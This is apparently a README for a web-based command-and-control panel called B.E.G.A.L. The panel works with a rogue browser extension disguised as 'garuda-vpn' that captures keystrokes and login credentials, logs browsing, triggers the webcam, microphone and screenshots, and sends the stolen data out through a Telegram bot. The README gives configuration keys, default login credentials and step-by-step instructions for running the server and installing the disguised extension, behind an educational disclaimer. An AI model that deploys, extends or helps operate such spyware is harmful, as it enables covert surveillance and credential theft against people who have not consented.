# B.E.G.A.L - C2 v2.0 (Final Documentation)

**B.E.G.A.L** (*Backdoor Exfiltration Gateway for Advanced Looting*) is an interactive, web-based Command and Control (C2) panel built with Python (Flask & Socket.IO). This platform is specifically designed to facilitate cybersecurity research, Red Teaming simulations, and educational purposes to understand how modern malware/botnets operate in exfiltrating data and controlling targets (bots) remotely.

---

## ⚠️ LEGAL WARNING & DISCLAIMER (VERY IMPORTANT)

**THIS PROJECT WAS CREATED SOLELY FOR EDUCATIONAL AND CYBERSECURITY RESEARCH PURPOSES.**

Any misuse of this tool for illegal activities, unauthorized system attacks, data theft, or other cybercrimes is **STRICTLY PROHIBITED**. The author, developers, and contributors bear no responsibility for any losses, damages, or legal actions arising from the use of this software.

**You are entirely responsible for your own actions.** By using this tool, you agree to abide by all applicable laws:
*   **Indonesian Law**: Comply with the Electronic Information and Transactions Law (UU ITE), particularly articles related to illegal access and interception of electronic systems.
*   **International Law**: Subject to international cybercrime regulations and your local jurisdiction (such as the Computer Fraud and Abuse Act/CFAA in the US, the Computer Misuse Act in the UK, GDPR regulations, etc.).
Only use this tool on systems you own or on systems where you have obtained **written authorization (Rules of Engagement)** from the system owner.

---

## ✨ Core Features and Functions

1.  **Real-Time C2 Dashboard**: Real-time monitoring of infected bot/target statuses via WebSockets, featuring simple Geographic Mapping visualization.
2.  **Stolen Credential Vault**: The system automatically intercepts, stores, and summarizes credentials (usernames/passwords) entered by the target into a clean Vault interface.
3.  **Dynamic Configuration (YAML)**: Sensitive settings are no longer hardcoded within the script; instead, they are configured through a `config.yaml` file for better security and easier customization.
4.  **Targeted Remote Commands**: Specific remote execution modules, such as:
    *   `Trigger Webcam` (Access target's camera)
    *   `Trigger Screenshot` (Capture target's desktop screen)
    *   `Trigger Mic` (Record target's audio)
5.  **Exfiltration Gateway**: A drag-and-drop upload interface designed to smuggle local files out via a Secure Telegram Tunnel.
6.  **Persistent Storage & Reporting**: Secure data storage into per-target-session SQLite databases, which are then summarized in a dedicated reporting feature (URL: `/report`).

---

## ⚙️ Dynamic Configuration (`config.yaml`)

In the latest version of B.E.G.A.L, the settings system has been made dynamic using a YAML configuration file. If this file does not exist, the system will automatically generate it (with default values) the first time `begal-fixed.py` is run.

Open the `config.yaml` file created in the same directory and adjust the following parameters:

```yaml
BOT_TOKEN: 'YOUR_BOT_TOKEN'
CHAT_ID: 'YOUR_CHAT_ID'
XOR_KEY: 'FLIPPER_SECURE_XOR_KEY_1337'
BCRYPT_PASSWORD_HASH: '$2a$12$VZnosb4amZbO1uQ4MniFhuFiqZVEmCF.3p1jXVoiXnG/3oztPLdxe'
```

*   **`BOT_TOKEN`**: The API Token for your Telegram bot (create one via `@BotFather`).
*   **`CHAT_ID`**: The ID of the Telegram channel/group used as the data exfiltration tunnel.
*   **`XOR_KEY`**: A symmetric cryptographic key used to obfuscate data transmission between the bot and the C2 server. Ensure this value matches the one in the browser extension.
*   **`BCRYPT_PASSWORD_HASH`**: The hash for C2 login (Default password: `datalost1337`).
*   **`DEFAULT USERNAME C2`**: flipper

---

## 🕷️ Integration with Browser Addon (`garuda-vpn`)

B.E.G.A.L is designed to work in tandem with an "agent" or payload. In this repository, the agent takes the form of a rogue browser extension (addon) disguised as **`garuda-vpn`**.

**How the Integration Works:**
1.  **Agent Installation**: The `garuda-vpn` folder contains the malicious payload (e.g., `background.js`, `content.js`, and `manifest.json`). This extension must be installed on the target browser (e.g., via *Load unpacked* mode in Chrome/Edge).
2.  **Injection & Interception**: Once installed, this extension will (stealthily in the background) hijack browser functions to record keyboard input (login credentials), log URL history, and stand by to receive remote commands.
3.  **Covert Telemetry**: Data harvested by the `garuda-vpn` agent will be encrypted using the `XOR_KEY` and silently transmitted (beaconing) to the B.E.G.A.L C2 API endpoints (such as `/api/v1/collector`).
4.  **Command Execution**: The agent actively opens connections or continuously polls the B.E.G.A.L C2. When you click the "Trigger Webcam" button on the web panel, the C2 forwards the signal to the `garuda-vpn` extension, which then forces the execution of the webcam API on the target browser.

### How to Test:
1. Run the C2 panel (`python3 begal-c2.py`).
2. Open a Google Chrome / Chromium browser.
3. Type `chrome://extensions` in the URL bar. Enable **Developer Mode**.
4. Click **Load unpacked** and select the `garuda-vpn` folder.
5. Return to the B.E.G.A.L dashboard; you should see your target browser connected and listed in the *Active Bots* panel.

---

## 🚀 Installation & Running the C2

1. Ensure you have installed the Python requirements:
   ```bash
   pip install bcrypt Flask-SocketIO requests pyyaml
   ```
2. Run the C2 Server script:
   ```bash
   python3 begal-c2.py
   ```
3. Access the Dashboard via a browser at:
   **http://127.0.0.1:31337**
   *(Default login: flipper, password `datalost1337`)*
